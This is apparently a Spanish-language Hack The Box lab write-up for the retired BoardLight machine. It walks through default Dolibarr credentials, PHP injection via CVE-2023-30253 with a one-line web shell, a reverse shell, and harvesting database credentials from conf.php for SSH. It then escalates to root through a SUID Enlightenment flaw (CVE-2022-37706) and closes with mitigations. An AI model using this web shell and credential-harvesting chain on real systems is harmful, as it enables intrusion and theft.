---
machine: BoardLight
os: Linux
difficulty: Easy
platform: Hack The Box
category: Web / CMS
state: Retired
tags: [dolibarr, cve-2023-30253, suid, enlightenment, cve-2022-37706]
---

# BoardLight — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de método; sin flags ni credenciales reales.

## TL;DR

Dos hosts virtuales: `board.htb` y **`crm.board.htb`** con **Dolibarr 17.0.0** y credenciales por defecto (`admin:admin`). La inyección de código PHP del módulo de webs (**CVE-2023-30253**) da shell como `www-data`; `conf.php` guarda credenciales de **larissa** para SSH; y un SUID de **Enlightenment 0.23** (**CVE-2022-37706**) remata en root.

## Reconocimiento

```bash
nmap -p- -sCV <IP> -oN nmap.txt
ffuf -u http://board.htb -H 'Host: FUZZ.board.htb' -w subdomains.txt -fs 15949
# crm.board.htb
```

```text
22/tcp open  ssh
80/tcp open  http  Apache
```

## Enumeración

- Puertos, servicios y usuarios relevantes descritos en «Reconocimiento».

## Foothold

1. **Dolibarr 17.0.0** en `http://crm.board.htb` con `admin:admin`.
2. **CVE-2023-30253**: crear una página web con PHP en el editor y previsualizarla; el código se ejecuta.

```php
<?php system($_GET['c']); ?>
```

3. Reverse shell como `www-data` y lectura del `conf.php`:

```bash
grep -E 'dolibarr_main_db_(user|pass)' /var/www/html/crm.board.htb/htdocs/conf/conf.php
```

4. **SSH** con esas credenciales (`larissa`).

## Movimiento lateral

- La cadena reutiliza credenciales dentro del mismo host; no hay salto a un segundo equipo.
- El detalle está en «Escalada de privilegios».

## Escalada de privilegios

```bash
find / -perm -4000 -type f 2>/dev/null | grep -i enlight
```

```text
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys   (SUID, 0.23.1)
```

**CVE-2022-37706**: `enlightenment_sys` invoca `mount` con una ruta controlada; el exploit crea un directorio con nombre malicioso y obtiene root. EDB 51180 / PoC público.

## Evidencia

- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
- Los valores reales viven en `private/` y no se publican.

## Lecciones aprendidas

- **Subdominio**: sin `crm.board.htb` en `/etc/hosts` no se llega al CMS; `ffuf` con `-fs` filtra los falsos positivos.
- **Nombre del módulo**: la inyección va en webs/páginas, no en un plugin cualquiera.
- **Dolibarr actualizado** ya no es vulnerable: comprobar versión en el pie.

- Credenciales por defecto en un CMS interno son acceso inmediato.
- Un CMS con editor de plantillas es RCE si permite PHP.
- Los SUID "raros" (gestores de ventanas, utilidades) se enumeran con `find` y se buscan por versión.

## Mitigaciones y detección

- Solo claves, sin contraseña, y `AllowUsers`/`fail2ban` para limitar el acceso.
- Actualizar el CMS, poner un WAF delante y revisar la integridad de los ficheros.

## Referencias

- [CVE-2022-37706](https://nvd.nist.gov/vuln/detail/CVE-2022-37706)
- [CVE-2023-30253](https://nvd.nist.gov/vuln/detail/CVE-2023-30253)
